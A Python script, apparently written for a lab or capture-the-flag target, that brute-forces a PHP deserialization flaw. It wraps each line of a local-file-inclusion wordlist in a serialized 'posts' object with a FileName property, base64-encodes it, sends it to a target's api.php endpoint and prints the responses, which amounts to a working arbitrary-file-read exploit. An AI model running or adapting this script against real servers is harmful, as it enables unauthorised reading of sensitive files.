#! /usr/env/dev python3
"""
Script to brute force deserializer

Example to use and pipe to a file
Adjust "unserialized_string" variable to fit the payload
python3 main.py -u http://google.com:39320 -w /usr/share/wordlist/lfi.txt >> ./output.txt

"""
from base64 import b64encode
from requests import session
import argparse


# User variables
path_to_wordlist = ""
target_uri = ""


# Load User Flags! -u = URL and -w for the wordlist
def load_user_flags():
    global path_to_wordlist, target_uri
    parser = argparse.ArgumentParser(description="-u for http//...:... -w path/to/wordlist")
    parser.add_argument(
        '-u',
        dest='full_uri',
        type=str,
        required=True,
        help='Example: -u http://biggy.com/api.php'
    )
    parser.add_argument(
        '-w',
        dest='wordlist_path_string',
        type=str,
        required=True,
        help='Example: -w /usr/local/wordlist/rockyou.txt'
    )
    user_args = parser.parse_args()
    target_uri = user_args.full_uri
    path_to_wordlist = user_args.wordlist_path_string



# Turn the string to Hex
def string_to_hex(income_string):
    print(income_string)
    sig_value = ''.join(['{:x}'.format(ord(letter)) for letter in income_string])
    return sig_value


def string_to_base64(input_str):
    # Convert the string to bytes, since base64 encoding requires bytes-like object
    input_bytes = input_str.encode('utf-8')
    
    # Encode these bytes into base64
    base64_bytes = b64encode(input_bytes)
    
    # Convert the base64 bytes back into a string
    base64_str = base64_bytes.decode('utf-8')
    print("\nInput string: {0}".format(input_str))
    return base64_str


# General function to create an array and re
def read_replace_append_line(income_array):
    array_content = []
    for line in income_array:
        # Prevent the same line to appear twice
        if line not in array_content:
            concatnated_line = line.replace("\n", "")
            array_content.append(concatnated_line)
    return array_content


# Take the wordlist path, and return it's content after read
def process_income_wordlist():
    try:
        with open(path_to_wordlist, "r") as wordlist_file:
            wordlist_content = read_replace_append_line(wordlist_file)
        return wordlist_content
    except FileNotFoundError:
        print("Wordlist not found")


def send_request(full_uri: str):
    global session
    try:
        initial_request = session.options(full_uri)
        print("Sent: {0}".format(full_uri))
        # Extra debuggin?
        # for header, value in initial_request.headers.items():print(header + ":", value)
        print(initial_request.content)
    except Exception as e:
        print('error\n', e)


# Convert the serializer into a string and send request
def convert_into_serializ_string(line):
    unserialized_string = 'O:5:"posts":1:{{s:8:"FileName";s:{0}:"{1}";}}'.format(len(line), line)
    based_serilized_data = string_to_base64(unserialized_string)
    send_request('{0}/api.php?post={1}'.format(target_uri, based_serilized_data))


def process_string_into_request(wordlist_line):
    convert_into_serializ_string(wordlist_line)
    

session = session()

# NOW RUN THE SMIT OF THIS SCRIPT
if __name__ == "__main__":
    load_user_flags()
    print("Running the script")  
    wordlist = process_income_wordlist()
    for requested_path in wordlist:
        process_string_into_request(requested_path)
    print("Finished")